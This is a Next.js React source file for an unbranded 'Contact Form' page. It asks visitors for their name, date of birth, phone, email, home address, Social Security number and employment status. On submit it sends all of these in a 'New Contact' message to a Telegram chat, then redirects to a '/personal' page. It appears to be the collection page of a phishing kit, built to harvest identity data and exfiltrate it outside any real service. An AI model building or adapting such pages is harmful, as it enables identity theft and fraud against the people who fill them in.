/* eslint-disable @next/next/no-img-element */
"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Head from "next/head";
import { sendTelegramMessage } from "../../utils/telegram"; 

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$/; 
const zipRegex = /^\d{5}$/; 
const ssnRegex = /^\d{3}-\d{2}-\d{4}$/; 

const validateInput = (field: string, value: string): string => {
  switch (field) {
    case "email":
      return emailRegex.test(value) ? "" : "Please enter a valid email address.";
    case "phone":
      return phoneRegex.test(value) ? "" : "Phone number must be in (XXX) XXX-XXXX format.";
    case "day":
    case "month":
    case "year":
      return value.trim() ? "" : "This field is required.";
    case "firstName":
    case "lastName":
    case "address":
    case "state":
      return value.trim() ? "" : `${field.charAt(0).toUpperCase() + field.slice(1)} is required.`;
    case "zipcode":
      return zipRegex.test(value) ? "" : "Please enter a valid 5-digit ZIP code.";
    case "ssn":
      return ssnRegex.test(value) ? "" : "SSN must be in XXX-XX-XXXX format.";
    default:
      return "";
  }
};

const FormPage = () => {
  type FormErrors = {
    firstName?: string;
    lastName?: string;
    day?: string;
    month?: string;
    year?: string;
    phone?: string;
    email?: string;
    address?: string;
    state?: string;
    zipcode?: string;
    ssn?: string;
    employmentStatus?: string;
  };

  const [formErrors, setFormErrors] = useState<FormErrors>({});
  const [phone, setPhone] = useState<string>("");
  const [zipcode, setZipcode] = useState<string>("");
  const [state, setState] = useState<string>("");
  const [day, setDay] = useState<string>("");
  const [month, setMonth] = useState<string>("");
  const [year, setYear] = useState<string>("");
  const [ssn, setSsn] = useState<string>("");
  const [employmentStatus] = useState<string>("");
  const router = useRouter();

  const formatPhoneNumber = (input: string) => {
    const cleaned = input.replace(/\D/g, "");
    if (cleaned.length <= 3) return `(${cleaned}`;
    if (cleaned.length <= 6) return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
    return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6, 10)}`;
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedPhone = formatPhoneNumber(e.target.value);
    setPhone(formattedPhone);
  };

  const handleSsnChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const cleaned = e.target.value.replace(/\D/g, "");
    let formattedSsn = cleaned;
    if (cleaned.length > 3) formattedSsn = `${cleaned.slice(0, 3)}-${cleaned.slice(3, 5)}`;
    if (cleaned.length > 5) formattedSsn = `${cleaned.slice(0, 3)}-${cleaned.slice(3, 5)}-${cleaned.slice(5, 9)}`;
    setSsn(formattedSsn);
  };

  const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const form = e.currentTarget;
    const formData = {
      firstName: (form.elements.namedItem("firstName") as HTMLInputElement).value,
      lastName: (form.elements.namedItem("lastName") as HTMLInputElement).value,
      day,
      month,
      year,
      phone,
      email: (form.elements.namedItem("email") as HTMLInputElement).value,
      address: (form.elements.namedItem("address") as HTMLInputElement).value,
      state,
      zipcode,
      ssn,
      employmentStatus,
    };

    const errors: Record<string, string> = {};

    Object.keys(formData).forEach((field) => {
      const typedField = field as keyof typeof formData;
      const error = validateInput(typedField, formData[typedField]);

      if (error) errors[typedField] = error;
    });

    if (Object.keys(errors).length > 0) {
      setFormErrors(errors);
      return;
    }

    const dob = `${formData.year}-${formData.month}-${formData.day}`;

    const message = `New Contact
      - Full Name: ${formData.firstName} ${formData.lastName}
      - Date of Birth: ${dob}
      - Phone: ${formData.phone}
      - Email: ${formData.email}
      - Address: ${formData.address}
      - State: ${formData.state}
      - Zipcode: ${formData.zipcode}
      - SSN: ${formData.ssn}
      - Employment Status: ${formData.employmentStatus}
      - Time: ${new Date().toLocaleString()}`;

    try {
      await sendTelegramMessage(message);
      router.push("/personal");
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
      alert("An error occurred while submitting the form. Please try again.");
    }
  };

  const states = [
    "AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA", "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD", "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ", "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC", "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY"
  ];

  return (
    <>
      <Head>
        <title>Contact Form</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <style>{`
          input:-webkit-autofill,
          select:-webkit-autofill {
            background-color: transparent !important;
            color: black !important;
            -webkit-box-shadow: 0 0 0px 1000px white inset !important;
          }

          input:-webkit-autofill:focus,
          select:-webkit-autofill:focus {
            background-color: transparent !important;
            color: black !important;
          }
        `}</style>
      </Head>
      <div className="min-h-screen flex flex-col bg-gray-50">
        <header className="bg-green-500 border-b-4 shadow-lg">
          <div className="max-w-7xl mx-auto flex items-center p-4">
            <a href="#" className="flex items-center text-white text-xl font-bold">
              <img src="/logogreen.svg" alt="Logo" className="h-8 mr-3" /> {/* Add your logo here */}
            </a>
          </div>
        </header>

        <main className="flex-grow container mx-auto mt-12 px-4">
          <div className="max-w-lg mx-auto bg-white p-10 shadow-xl rounded-lg border-t-4 border-green-500">
            <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">Tell us more about yourself</h1>
            <p className="text-sm text-gray-600 text-center mb-8">Please fill out the form below to submit your information.</p>
            <form onSubmit={handleFormSubmit}>
              {/* Name Fields */}
              <div className="grid grid-cols-2 gap-6 mb-6">
                <div>
                  <label htmlFor="firstName" className="block text-sm font-medium text-black">First Name</label>
                  <input
                    id="firstName"
                    name="firstName"
                    type="text"
                    required
                    className={`w-full mt-2 border ${formErrors.firstName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.firstName ? "focus:ring-red-500" : "focus:ring-green-500"}`}
                  />
                  {formErrors.firstName && <p className="text-sm text-red-500 mt-2">{formErrors.firstName}</p>}
                </div>

                <div>
                  <label htmlFor="lastName" className="block text-sm font-medium text-black">Last Name</label>
                  <input
                    id="lastName"
                    name="lastName"
                    type="text"
                    required
                    className={`w-full mt-2 border ${formErrors.lastName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.lastName ? "focus:ring-red-500" : "focus:ring-green-500"}`}
                  />
                  {formErrors.lastName && <p className="text-sm text-red-500 mt-2">{formErrors.lastName}</p>}
                </div>
              </div>

              {/* Date of Birth Fields */}
              <div className="grid grid-cols-3 gap-6 mb-6">
                <div>
                  <label htmlFor="day" className="block text-sm font-medium text-black">Day</label>
                  <input
                    id="day"
                    name="day"
                    type="text"
                    required
                    value={day}
                    onChange={(e) => setDay(e.target.value)}
                    className={`w-full mt-2 border ${formErrors.day ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.day ? "focus:ring-red-500" : "focus:ring-green-500"}`}
                  />
                  {formErrors.day && <p className="text-sm text-red-500 mt-2">{formErrors.day}</p>}
                </div>

                <div>
                  <label htmlFor="month" className="block text-sm font-medium text-black">Month</label>
                  <input
                    id="month"
                    name="month"
                    type="text"
                    required
                    value={month}
                    onChange={(e) => setMonth(e.target.value)}
                    className={`w-full mt-2 border ${formErrors.month ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.month ? "focus:ring-red-500" : "focus:ring-green-500"}`}
                  />
                  {formErrors.month && <p className="text-sm text-red-500 mt-2">{formErrors.month}</p>}
                </div>

                <div>
                  <label htmlFor="year" className="block text-sm font-medium text-black">Year</label>
                  <input
                    id="year"
                    name="year"
                    type="text"
                    required
                    value={year}
                    onChange={(e) => setYear(e.target.value)}
                    className={`w-full mt-2 border ${formErrors.year ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.year ? "focus:ring-red-500" : "focus:ring-green-500"}`}
                  />
                  {formErrors.year && <p className="text-sm text-red-500 mt-2">{formErrors.year}</p>}
                </div>
              </div>

              {/* Phone Number */}
              <div className="mb-6">
                <label htmlFor="phone" className="block text-sm font-medium text-black">Phone Number</label>
                <input
                  id="phone"
                  name="phone"
                  type="text"
                  required
                  value={phone}
                  onChange={handlePhoneChange}
                  className={`w-full mt-2 border ${formErrors.phone ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.phone ? "focus:ring-red-500" : "focus:ring-green-500"}`}
                />
                {formErrors.phone && <p className="text-sm text-red-500 mt-2">{formErrors.phone}</p>}
              </div>

              {/* Email Address */}
              <div className="mb-6">
                <label htmlFor="email" className="block text-sm font-medium text-black">Email Address</label>
                <input
                  id="email"
                  name="email"
                  type="email"
                  required
                  className={`w-full mt-2 border ${formErrors.email ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.email ? "focus:ring-red-500" : "focus:ring-green-500"}`}
                />
                {formErrors.email && <p className="text-sm text-red-500 mt-2">{formErrors.email}</p>}
              </div>

              {/* Address */}
              <div className="mb-6">
                <label htmlFor="address" className="block text-sm font-medium text-black">Address</label>
                <input
                  id="address"
                  name="address"
                  type="text"
                  required
                  className={`w-full mt-2 border ${formErrors.address ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.address ? "focus:ring-red-500" : "focus:ring-green-500"}`}
                />
                {formErrors.address && <p className="text-sm text-red-500 mt-2">{formErrors.address}</p>}
              </div>

              {/* State */}
              <div className="mb-6">
                <label htmlFor="state" className="block text-sm font-medium text-black">State</label>
                <select
                  id="state"
                  name="state"
                  required
                  value={state}
                  onChange={(e) => setState(e.target.value)}
                  className={`w-full mt-2 border ${formErrors.state ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.state ? "focus:ring-red-500" : "focus:ring-green-500"}`}
                >
                  <option value="" disabled>Select a state</option>
                  {states.map((state) => (
                    <option key={state} value={state}>
                      {state}
                    </option>
                  ))}
                </select>
                {formErrors.state && <p className="text-sm text-red-500 mt-2">{formErrors.state}</p>}
              </div>

              {/* Zip Code */}
              <div className="mb-6">
                <label htmlFor="zipcode" className="block text-sm font-medium text-black">Zip Code</label>
                <input
                  id="zipcode"
                  name="zipcode"
                  type="text"
                  required
                  value={zipcode}
                  onChange={(e) => setZipcode(e.target.value)}
                  className={`w-full mt-2 border ${formErrors.zipcode ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.zipcode ? "focus:ring-red-500" : "focus:ring-green-500"}`}
                />
                {formErrors.zipcode && <p className="text-sm text-red-500 mt-2">{formErrors.zipcode}</p>}
              </div>

              {/* SSN */}
              <div className="mb-6">
                <label htmlFor="ssn" className="block text-sm font-medium text-black">SSN</label>
                <input
                  id="ssn"
                  name="ssn"
                  type="text"
                  required
                  value={ssn}
                  onChange={handleSsnChange}
                  className={`w-full mt-2 border ${formErrors.ssn ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.ssn ? "focus:ring-red-500" : "focus:ring-green-500"}`}
                />
                {formErrors.ssn && <p className="text-sm text-red-500 mt-2">{formErrors.ssn}</p>}
              </div>
              <div className="mb-6">
  <label htmlFor="employmentStatus" className="block text-sm font-medium text-black">
    Employment Status
  </label>
  <div className="relative">
    <select
      id="employmentStatus"
      name="employmentStatus"
      required
      className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-green-500"
      title="Select your employment status"
    >
      <option value="" disabled>Select your employment status</option>
      <option value="full-time">Full time</option>
      <option value="part-time">Part time</option>
      <option value="self-employed">Self-employed</option>
      <option value="seasonal">Seasonal (EI)</option>
      <option value="retired">Retired (pension)</option>
      <option value="maternity-leave">Maternity leave</option>
      <option value="disability">Disability</option>
      <option value="social-assistance">Social assistance (income supplement)</option>
      <option value="unemployed">Unemployed</option>
    </select>
    <div className="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none">
      <svg
        xmlns="http://www.w3.org/2000/svg"
        fill="none"
        viewBox="0 0 24 24"
        stroke="currentColor"
        className="w-5 h-5 text-gray-500"
      >
        <path
          strokeLinecap="round"
          strokeLinejoin="round"
          strokeWidth="2"
          d="M19 9l-7 7-7-7"
        />
      </svg>
    </div>
  </div>
</div>


              <div className="flex justify-center mb-8">
                <button type="submit" className="w-full bg-green-500 hover:bg-green-600 text-white p-4 rounded-xl shadow-md focus:outline-none">
                  Submit
                </button>
              </div>
            </form>
          </div>
        </main>
      </div>
    </>
  );
};

export default FormPage;
